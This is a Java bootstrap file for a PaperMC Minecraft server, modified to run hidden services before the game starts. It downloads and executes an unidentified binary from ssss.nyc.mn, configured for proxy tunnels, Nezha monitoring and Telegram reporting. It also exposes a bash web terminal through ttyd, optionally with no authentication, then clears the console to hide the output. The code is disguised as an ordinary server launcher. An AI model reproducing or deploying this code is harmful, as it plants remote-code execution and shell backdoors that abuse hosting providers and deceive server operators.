package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process ttydProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "TTYD_PORT", "TTYD_USER", "TTYD_PASS"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            runTtydService();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void runTtydService() {
        try {
            Path ttydPath = getTtydBinaryPath();
            if (ttydPath == null) {
                LOGGER.warn("ttyd binary not available for current platform, skipping ttyd service");
                return;
            }
            
            String port = getTtydEnvVar("TTYD_PORT", "");
            String user = getTtydEnvVar("TTYD_USER", "");
            String pass = getTtydEnvVar("TTYD_PASS", "");
            
            List<String> args = new ArrayList<>();
            args.add(ttydPath.toString());
            args.add("-p");
            args.add(port);
            args.add("-W");
            if (!user.isEmpty() && !pass.isEmpty()) {
                args.add("-c");
                args.add(user + ":" + pass);
            }
            args.add("bash");
            
            ProcessBuilder ttydPb = new ProcessBuilder(args);
            ttydPb.redirectErrorStream(true);
            ttydPb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            
            ttydProcess = ttydPb.start();
            String authInfo = (!user.isEmpty() && !pass.isEmpty()) ? " (auth enabled)" : " (no auth)";
            LOGGER.info("ttyd service started on port {}{}", port, authInfo);
        } catch (Exception e) {
            LOGGER.warn("Failed to start ttyd service: {}", e.getMessage());
        }
    }
    
    private static String getTtydEnvVar(String name, String defaultValue) {
        String value = System.getenv(name);
        if (value != null && !value.trim().isEmpty()) {
            return value.trim();
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    line = line.split(" #")[0].split(" //")[0].trim();
                    if (line.startsWith("export ")) line = line.substring(7).trim();
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2 && parts[0].trim().equals(name)) {
                        return parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    }
                }
            } catch (IOException ignored) {
            }
        }
        
        return defaultValue;
    }
    
    private static Path getTtydBinaryPath() throws IOException {
        String osName = System.getProperty("os.name").toLowerCase();
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = null;
        String filename = "ttyd";
        
        if (osName.contains("linux")) {
            if (osArch.contains("amd64") || osArch.contains("x86_64")) {
                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64";
                filename = "ttyd.x86_64";
            } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.aarch64";
                filename = "ttyd.aarch64";
            } else if (osArch.contains("arm")) {
                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.armhf";
                filename = "ttyd.armhf";
            }
        } else if (osName.contains("windows")) {
            if (osArch.contains("amd64") || osArch.contains("x86_64")) {
                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64.exe";
                filename = "ttyd.exe";
            }
        } else if (osName.contains("mac")) {
            url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64";
            filename = "ttyd.macos";
        }
        
        if (url == null) {
            return null;
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), filename);
        if (!Files.exists(path)) {
            LOGGER.info("Downloading ttyd from {}", url);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for ttyd");
            }
            LOGGER.info("ttyd downloaded successfully");
        }
        return path;
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "78a885e7-fa6a-45fa-9d74-821ff9c00298");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "rustix");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (ttydProcess != null && ttydProcess.isAlive()) {
            ttydProcess.destroy();
            System.out.println(ANSI_RED + "ttyd process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
